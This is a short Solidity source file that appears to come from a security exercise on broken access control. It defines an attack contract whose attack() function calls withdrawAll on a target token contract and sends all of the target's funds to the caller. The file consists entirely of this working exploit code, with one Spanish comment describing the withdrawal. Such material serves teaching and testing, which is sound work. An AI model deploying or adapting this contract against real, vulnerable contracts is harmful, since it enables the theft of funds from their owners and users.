// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITokenBadAccessControl {
    function withdrawAll(address payable _to) external;
}

contract BadAccessControlAttack {
    ITokenBadAccessControl public target;

    constructor(address _target) {
        target = ITokenBadAccessControl(_target);
    }

    function attack() public {
        target.withdrawAll(payable(msg.sender)); // Llamada a sacar fondos del contrato
    }
}